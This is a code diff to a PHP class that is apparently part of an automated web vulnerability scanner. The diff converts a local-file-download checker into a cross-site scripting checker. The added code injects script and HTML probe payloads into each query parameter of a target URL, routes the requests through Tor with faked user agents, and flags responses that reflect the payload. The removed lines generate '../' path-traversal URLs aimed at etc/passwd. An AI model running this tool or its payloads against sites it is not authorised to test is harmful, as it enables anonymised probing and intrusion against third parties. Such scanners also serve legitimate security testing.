@@ -3,10 +3,10 @@
 namespace Aszone\Vulnerabilities;
 
 use Respect\Validation\Validator as v;
-use Aszone\FakeHeaders;
+use Aszone\FakeHeaders\FakeHeaders;
 use GuzzleHttp\Client;
 
-class LocalFileDownload
+class CrossSiteScripting
 {
     public $targets;
 
@@ -15,6 +15,14 @@ class LocalFileDownload
     public $tor;
 
     public $commandData;
+
+    public $exploit1;
+
+    public $exploit2;
+
+    public $exploit1Regex;
+
+    public $exploit2Regex;
 
     public function __construct($commandData, $targets)
     {
@@ -25,6 +33,10 @@ class LocalFileDownload
             $this->commandData['tor'] = $this->commandData['torl'];
         }
         $this->targets = $targets;
+        $this->exploit1= "<script>alert(aaabbbccc);</script>";
+        $this->exploit2= "<h1>aaabbbccc</h1>";
+        $this->exploit1Regex= "<script>alert\(aaabbbccc\);<\/script>";
+        $this->exploit2Regex= "<h1>aaabbbccc<\/h1>";
     }
 
     private function defaultEnterData()
@@ -66,7 +78,7 @@ class LocalFileDownload
 
     protected function checkSuccess()
     {
-        $isValidLfd = $this->isLfd($this->target);
+        $isValidLfd = $this->isXss($this->target);
         if (!$isValidLfd) {
             return false;
         }
@@ -74,10 +86,10 @@ class LocalFileDownload
         return $this->setVull();
     }
 
-    protected function isLfd($target)
+    protected function isXss($target)
     {
-        $validLfd = preg_match("/\?|(.+?)\=/", $target, $m);
-        if ($validLfd) {
+        $validXss = preg_match("/\?|(.+?)\=/", $target, $m);
+        if ($validXss) {
             return true;
         }
 
@@ -88,14 +100,12 @@ class LocalFileDownload
     {
         //$ext=$this->getExtension($this->target);
         $urlsForAttack = $this->generatesUrlForAttack();
-
         $resultcheckAttack = [];
         echo "\n";
         foreach ($urlsForAttack as $urlAttack) {
             $resultcheckAttack = $this->setAttack($urlAttack);
-            if (!empty($resultcheckAttack) and $this->checkIsFileOfsystem($resultcheckAttack)) {
+            if (!empty($resultcheckAttack)) {
                 echo 'Is Vull';
-
                 return $urlAttack;
             }
         }
@@ -103,15 +113,6 @@ class LocalFileDownload
         return false;
     }
 
-    protected function checkIsFileOfsystem($bodyFile)
-    {
-        $isValid = preg_match("/<%@|<%|<\?php|<\?=/", $bodyFile, $m);
-        if ($isValid) {
-            return true;
-        }
-
-        return false;
-    }
 
     protected function setAttack($url)
     {
@@ -121,10 +122,16 @@ class LocalFileDownload
             'headers' => ['User-Agent' => $header->getUserAgent()],
             'proxy' => $this->commandData['tor'],
             'timeout' => 30,
-            ],
+        ],
         ]);
         try {
-            return $client->get($url)->getBody()->getContents();
+            $body= $client->get($url)->getBody()->getContents();
+            if($body){
+                if($this->checkExistValueGetInBody($body) AND !$this->checkError($body)){
+                    return $url;
+                }
+            }
+
         } catch (\Exception $e) {
             //echo "Error code => ".$e->getCode()."\n";
             echo '#';
@@ -133,17 +140,26 @@ class LocalFileDownload
         return false;
     }
 
+    protected function checkExistValueGetInBody($body){
+
+        //$valid=preg_match("/<script>alert\(aaabbbccc\);<\/script\>|<h1>aaabbbccc<\/h1>/",$body,$m);
+        $valid=preg_match("/".$this->exploit1Regex."|".$this->exploit2Regex."/",$body,$m);
+        if($valid){
+            return true;
+        }
+        return false;
+
+    }
+
     protected function generatesUrlForAttack()
     {
         echo "\n".$this->target;
-        $explodeUrl = parse_url($this->target);
-        $ext = $this->getExtension();
-        $urlFinal = [];
-        $urlsIndex = $this->generateUrlsByExploit('index.'.$ext);
-        $urlsPath = $this->generateUrlsByExploit($explodeUrl['path']);
-        $urlsEtc = $this->generateUrlsByExploit('etc/passwd');
-        $urlsFinal = array_merge($urlsPath, $urlsIndex, $urlsEtc);
-        return $urlFinal;
+        $urlsFinal = [];
+        $urls1 = $this->generateUrlsByExploit($this->exploit1);
+        $urls2 = $this->generateUrlsByExploit($this->exploit2);
+        $urlsFinal = array_merge($urls1, $urls2);
+
+        return $urlsFinal;
     }
 
     protected function generateUrlsByExploit($exploit)
@@ -155,47 +171,16 @@ class LocalFileDownload
         foreach ($explodeQuery as $keyQuery => $query) {
             $explodeQueryEqual = explode('=', $query);
             $wordsValue[$explodeQueryEqual[0]] = $explodeQueryEqual[1];
-            //$wordsKey[$keyQuery]=$explodeQueryEqual[0];
         }
+
         foreach($wordsValue as $keyValue => $value){
             $urls[]=str_replace($keyValue."=".$value,$keyValue."=??????????",$this->target);
         }
 
-        /*foreach ($explodeQuery as $keyQuery => $query) {
-            $queryUrl = '';
-            $preUrl = str_replace($wordsValue[$keyQuery], '??????????', $this->target);
-            $urls[] = $preUrl;
-            $explodePreUrl = parse_url($preUrl);
-            $explodePreQuery = explode('&', $explodePreUrl['query']);
-            foreach ($explodePreQuery as $preQuery) {
-                $explodePreQueryEqual = explode('=', $preQuery);
-                if ($explodePreQueryEqual[1] != '??????????') {
-                    $queryUrl .= $explodePreQueryEqual[0].'=&';
-                } else {
-                    $queryUrl .= $explodePreQueryEqual[0].'=??????????&';
-                }
-            }
-            $mountUrl = parse_url($preUrl);
-            $queryUrl = substr($queryUrl, 0, -1);
-            $urls[] = $mountUrl['scheme'].'://'.$mountUrl['host'].$mountUrl['path'].'?'.$queryUrl;
-        }*/
-
-        // Finish first find
-
-        //Change ??? on value hacking
         $urlFinal = [];
         foreach ($urls as $url) {
             $urlFinal[] = str_replace('??????????', $exploit, $url);
-
-            //Url Of ResultPath
-            $breakFolder = '../';
-
-            for ($i = 1;$i <= 10;++$i) {
-                $urlFinal[] = str_replace('??????????', $breakFolder.$exploit, $url);
-                $breakFolder .= '../';
-            }
         }
-
         return $urlFinal;
     }
 
@@ -271,5 +256,32 @@ class LocalFileDownload
         }
 
         return true;
+    }
+
+    protected function checkError($body)
+    {
+        //echo $body;
+        $errors = $this->getErrorsOfList();
+        foreach ($errors as $error) {
+            $isValid = strpos($body, $error);
+            if ($isValid !== false) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    protected function getErrorsOfList()
+    {
+        $errorsMysql = parse_ini_file(__DIR__ . '/resource/Errors/mysql.ini');
+        $errorsMariaDb = parse_ini_file(__DIR__ . '/resource/Errors/mariadb.ini');
+        $errorsOracle = parse_ini_file(__DIR__ . '/resource/Errors/oracle.ini');
+        $errorssqlServer = parse_ini_file(__DIR__ . '/resource/Errors/sqlserver.ini');
+        $errorsPostgreSql = parse_ini_file(__DIR__ . '/resource/Errors/postgresql.ini');
+        $errorsAsp = parse_ini_file(__DIR__ . '/resource/Errors/asp.ini');
+        $errorsPhp = parse_ini_file(__DIR__ . '/resource/Errors/php.ini');
+
+        return array_merge($errorsMysql, $errorsMariaDb, $errorsOracle, $errorssqlServer, $errorsPostgreSql,$errorsAsp,$errorsPhp );
     }
 }
